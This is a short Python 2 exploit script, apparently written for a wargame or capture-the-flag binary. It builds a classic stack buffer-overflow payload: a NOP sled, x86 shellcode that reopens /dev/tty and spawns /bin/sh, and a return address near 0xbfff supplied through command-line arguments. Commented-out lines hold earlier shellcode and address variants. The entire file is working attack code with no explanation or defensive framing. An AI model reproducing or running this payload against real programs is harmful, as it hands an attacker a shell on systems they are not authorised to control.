import sys
from itertools import izip_longest

def grouper(i, n):
    return izip_longest(*([iter(i)]*n))

#s = "31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05"
#s = "31c050682f2f7368682f62696e89e3505389e1b00bcd80"
s = "31c9f7e1b00b51682f2f7368682f62696e89e3cd80"

shellc = ''.join(map(lambda x: chr(int(''.join(x), 16)), grouper(s, 2)))
#shellc += "/bin/bash"

#memloc1 = chr(0xD8) + chr(0xF7) + chr(0xFF) + chr(0xBF)
#memloc2 = chr(0xD0) + chr(0xF7) + chr(0xFF) + chr(0xBF)
#nops = chr(0x90)*(int(sys.argv[1])-len(shellc) - 20)
#sys.stdout.write(nops + shellc + chr(0x90)*20 + memloc2 + memloc2)

#memloc2 = chr(int(sys.argv[1])) + chr(0xF7) + chr(0xFF) + chr(0xBF)

shellc = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

memloc2 = chr(int(sys.argv[1])) + chr(int(sys.argv[2])) + chr(0xFF) + chr(0xBF)

nops = chr(0x90)*(76-len(shellc)-20)
sys.stdout.write(nops + shellc + chr(0x90) * 20 + memloc2)
